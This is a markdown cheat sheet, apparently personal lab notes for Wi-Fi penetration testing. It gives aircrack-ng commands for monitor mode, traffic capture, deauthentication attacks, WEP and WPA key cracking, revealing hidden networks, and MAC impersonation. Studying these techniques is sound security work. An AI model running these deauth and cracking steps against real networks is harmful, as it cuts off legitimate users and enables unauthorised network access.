# WI-FI CODE SNIPPETS
## MISC
```
iwconfig
```
```
systemctl restart NetworkManager
```
Grab all networks nearby:
```
iwlist wlan1 s | grep 'Cell\|Quality\|ESSID\|IEEE\|Mode\|Frequency\|Channel\|Quality\|Signal Level' | tee wifi_scan.txt
```

---

## Setup
Set router to max power
```
ifconfig wlan1 down
```
```
iwconfig wlan1 txpower 30
```
```
ifconfig wlan1 up
```
Preemptively kill everything that gets in your way:
```
sudo airmon-ng check kill
```
Start monitor mode:
```
sudo airmon-ng start wlan1
```
Run a test:
```
sudo aireplay-ng --test wlan1mon
```
Should see `Injection is working!`
Restart NetworkManager
```
systemctl restart NetworkManager
```
Save what's out there and save to a file:
```
sudo airodump-ng wlan1mon --band agp -w dump
```

---

## Airmon-ng
Start monitor mode:
```
sudo airmon-ng start wlan1
```
Stop monitor mode:
```
sudo airmon-ng stop wlan0mon
```
- `BSSID` column are Access Points (AP)
- `STATION`column are Clients trying to access APs
- `Probes` are telling you what the client is trying to connect to (if any)
- (not associated) means that the client is powered on with WiFi enabled, visible to your monitoring interface but NOT connected to any AP in the area. It just happens to be on the same channel

## Airodump-ng
Dump network traffic to file:
airodump-ng is configured to scan exclusively for networks operating on the 2.4 GHz band so use `--band abg` if necessary
```
sudo airodump-ng wlan1mon --band abg -w dump
```
For a specific BSSID:
```
sudo airodump-ng wlan1mon --bssid [] --channel [] -w dump
```

## Airgraph-ng
Visualize APs and Clients with:
Use airodump-ng `.csv`s
```
sudo airgraph-ng -i dump-01.csv -g CAPR -o dumpCAPR.png
```
OR for CPG:
```
sudo airgraph-ng -i HTB-01.csv -g CPG -o dumpCPG.png
```
Test with: (Injection Working!)
```
sudo aireplay-ng --test wlan0mon
```

## Aireplay-ng
```
aireplay-ng
```
```
sudo aireplay-ng -0 5 -a ACCESSPOINTBSSID -c CLIENTBSSID wlan1mon
```

## Aircrack-ng
Benchmark with this command, it will tell you how many passphrases you can crack a second, it's dependent on what else is using the CPU:
```
sudo aircrack-ng -S
```
Crack WEP Key, use `--ivs` in aurodump-ng command to only capture the IVs (Initialization Vectors). Once enough are captured:
```
sudo aircrack-ng -K HTB.ivs
```
Crack WPA, make sure the "four-way handshake" is in the `.pcap` by deauthing client from AP.
```
sudo aircrack-ng HTB.pcap -w /opt/wordlist.txt
```

## Airdecap-ng
Need network passphrase / WEP Key and the `.pcap` file of captured traffic
```
sudo airdecap-ng
```
Decrypt WEP
```
sudo airdecap-ng -w <WEP-key> <capture-file>
```
Decrypt WPA:
```
sudo airdecap-ng -p 'passphrase' capture-file -e 'essid'
```
- This will make a new `pcap`/`cap` file for you to look at in Wireshark
- `!` will break double quotes
- It's ESSID, not BSSID

## Deauth
0. Do setup
1. Run airmon-ng to file and see everything: `sudo airodump-ng wlan1mon --band abg -w []`
2. Find your AP BSSID or ESSID amongst files: `cat []-01.csv | grep -i Lands`
3. Run airmon-ng specifically on BSSID or ESSID + correct channel: `sudo airodump-ng wlan1mon --bssid [] --channel [] -w []`
4. Find target client's BSSID to deauth: `STATIONS`
5. Run aireplay-ng on it: `sudo aireplay-ng -0 5 -a ACCESSPOINTBSSID -c CLIENTBSSID wlan1mon`
- `5` is the number of deauth packets, `0` would be to send them continously.
- `-0` = deauth attack (`--deauth` would also work here)
```
sudo aireplay-ng -0 5 -a ACCESSPOINT-BSSID -c CLIENT-BSSID wlan1mon
```
You have to be on the same channel as the AP you're deauthing, change it with:
```
iwconfig wlan1mon channel X
```

## Crack password
0. Do setup
1. Runairmon-ng to file and see everything: `sudo airodump-ng wlan1mon --band abg -w []`
2. Find your AP BSSID or ESSID amongst files: `cat []-01.csv | grep -i Lands`
3. Run airmon-ng specifically on BSSID or ESSID + correct channel: `sudo airodump-ng wlan1mon --bssid [] --channel [] -w []`
4. Watch and wait for airmon-ng to capture handshake, noted top right OR momentarily deauth a client in another terminal (as above) to capture handshake.
5. Run `sudo aircrack-ng test-04.cap -w fakewordlist.txt`

## Get Hidden Network Names
0. Do setup
1. Find hidden nework with clients connected
2. Deauth clients
3. Reconnection will contain network name

# EXTRAS
- Note that it is possible to connect to APs via CLI
- Your phone will randomise it's MAC address when it connects to a network, you can see it `Wifi` --> `Settings` --> `View more`
- When testing on phone, it should deauth nearly immediately.
- Router was hiding 2 networks (2.4/5) behind one ESSID, deauthing my phone from one would make it silently switch to the other. Segregating the 2 networks into their own uniquely named networks allowed me to deauth the phone from the network without it reauthing to the other. 'Forgetting' the other network also helped I think to it wouldn't reconnect.
- Remember 2 devices can't connect to the same network with the same MAC address so either:
  - Perpetually deauth legit client to free up space however it's most effective when the client we're mimicking is not currently connected to our target network at all.
  - Connect to the other frequency the device isn't connected to on the network (5 or 2.4)



## Rasberry Pi MAC address ranges:
```
28:CD:C1:xx:xx:xx
B8:27:EB:xx:xx:xx
D8:3A:DD:xx:xx:xx
DC:A6:32:xx:xx:xx
E4:5F:01:xx:xx:xx
```
## [Channels](https://en.wikipedia.org/wiki/List_of_WLAN_channels)
- 2.4GHz Wi-Fi uses the channels1-14, but for best performance, only channels 1, 6, and 11 should be used as these are the only channels that do not overlap with each other, minimizing interference from other Wi-Fi networks and devices.
- 5GHz Wi-Fi uses channels within specific frequency bands, with non-overlapping 20MHz channels typically numbered 36-48, 52-64, 100-144, and 149-165. Some channels, particularly in the 52-64 and 100-144 ranges, are Dynamic Frequency Selection (DFS) channels that are reserved for radar systems and require devices to avoid radar interference. 



---

## Install Alpha Adapter
Configuring the Alpha AWUS036ACH Wi-Fi Adapter - [Link](https://medium.com/@wicked_picker/configuring-the-alpha-awus036ach-wi-fi-adapter-on-kali-linux-eb5ec2826713)
See available USBs:
```
lsusb
```
Then see it NOT here:
```
iwconfig
```
Install the Realtek drivers:
```
apt-get install realtek-rtl88xxau-dkms
```
Install dkms:
```
sudo apt-get install dkms
```
Download the rtl8812au drivers from GitHub
```
git clone https://github.com/aircrack-ng/rtl8812au
```
```
cd rtl8812au
```
Preemptively fix the error:
```
sudo apt-get install linux-headers-$(uname -r)
```
```
make
```
```
sudo make install
```
```
reboot
```
```
iwconfig
```

---


